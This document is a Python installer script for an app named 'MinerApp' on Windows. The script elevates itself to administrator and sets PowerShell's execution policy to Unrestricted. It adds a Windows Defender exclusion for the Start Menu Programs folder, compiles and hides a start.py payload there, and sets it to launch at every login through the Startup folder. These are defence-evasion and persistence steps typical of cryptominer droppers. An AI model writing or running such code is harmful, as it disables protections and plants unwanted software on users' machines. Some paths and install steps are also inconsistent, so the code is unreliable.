import os
import sys
import shutil
import subprocess
import urllib.request
import time
import ctypes
from pathlib import Path

# Function to check if the script is run as admin
def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() == 1
    except:
        return False

# Function to set PowerShell execution policy to Unrestricted
def set_execution_policy():
    try:
        # PowerShell command to set execution policy
        command = 'PowerShell -Command "Set-ExecutionPolicy Unrestricted -Force"'
        # Run the command
        subprocess.run(command, shell=True, check=True)
        print("PowerShell execution policy set to Unrestricted.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to set execution policy: {e}")

# Function to add exclusion to Windows Defender
def add_windows_defender_exclusion(path):
    try:
        # PowerShell command to add exclusion
        command = f'PowerShell -Command "Add-MpPreference -ExclusionPath \'{path}\'"'
        # Run the command
        subprocess.run(command, shell=True, check=True)
        print(f"Added exclusion for {path} to Windows Defender.")
    except subprocess.CalledProcessError as e:
        print(f"Failed to add exclusion: {e}")

# Function to install required modules
def install_packages():
    subprocess.check_call([sys.executable, "-m", "pip", "install", "requests", "psutil"])

# Ensure required packages are installed
try:
    import requests
    import psutil
except ImportError:
    print("Required modules not found. Installing...")
    install_packages()
    import requests
    import psutil

def main():
    if not is_admin():
        print("Script needs to be run as administrator.")
        # Re-run the script with admin privileges
        ctypes.windll.shell32.ShellExecuteW(None, "runas", sys.executable, __file__, None, 1)
        return

    # Set PowerShell execution policy to Unrestricted
    set_execution_policy()

    # Get the directory of the current script
    script_dir = os.path.dirname(os.path.realpath(__file__))

    # Get the APPDATA directory
    app_data = os.getenv('APPDATA')

    # Define the application directory path
    app_dir = os.path.join(app_data, 'Microsoft', 'Windows', 'StartMenu', 'Programs', 'MinerApp')

    # Add the Programs directory to Windows Defender exclusions
    add_windows_defender_exclusion(os.path.join(app_data, 'Microsoft', 'Windows', 'StartMenu', 'Programs'))

    # Create the application directory if it doesn't exist
    os.makedirs(app_dir, exist_ok=True)

    # Move the start.py file to the application directory
    shutil.move(os.path.join(script_dir, 'start.py'), app_dir)

    # Check if PyInstaller is installed and install it if not
    pyinstaller_path = shutil.which('pyinstaller')
    if not pyinstaller_path:
        print("PyInstaller not found, installing...")
        url = 'https://bootstrap.pypa.io/get-pip.py'
        pip_installer = os.path.join(script_dir, 'get-pip.py')
        urllib.request.urlretrieve(url, pip_installer)
        subprocess.run([sys.executable, pip_installer, 'install', 'pyinstaller'])

    # Compile start.py into a single executable file, specifying the dist path and using pythonw.exe
    start_py_path = os.path.join(app_dir, 'start.py')
    subprocess.run(['pyinstaller', '--onefile', '--clean', '--distpath', app_dir, start_py_path])

    # Create a shortcut in the Startup folder
    startup_folder = Path(os.getenv('APPDATA')) / 'Microsoft' / 'Windows' / 'Start Menu' / 'Programs' / 'Startup'
    shortcut_path = startup_folder / 'MinerApp.lnk'
    target_path = os.path.join(app_dir, 'start.exe')

    # Use PowerShell to create the shortcut
    powershell_command = f'$WScriptShell = New-Object -ComObject WScript.Shell; ' \
                         f'$Shortcut = $WScriptShell.CreateShortcut("{shortcut_path}"); ' \
                         f'$Shortcut.TargetPath = "{target_path}"; ' \
                         f'$Shortcut.Save()'
    subprocess.run(['powershell', '-Command', powershell_command], shell=True)

    time.sleep(5)

    exe_path = os.path.join(app_dir, 'start.exe')
    if os.path.exists(exe_path):
        subprocess.run([exe_path])
    else:
        print(f"Executable not found at {exe_path}")

    print("Setup complete and executable has been run if it was found.")

if __name__ == "__main__":
    main()




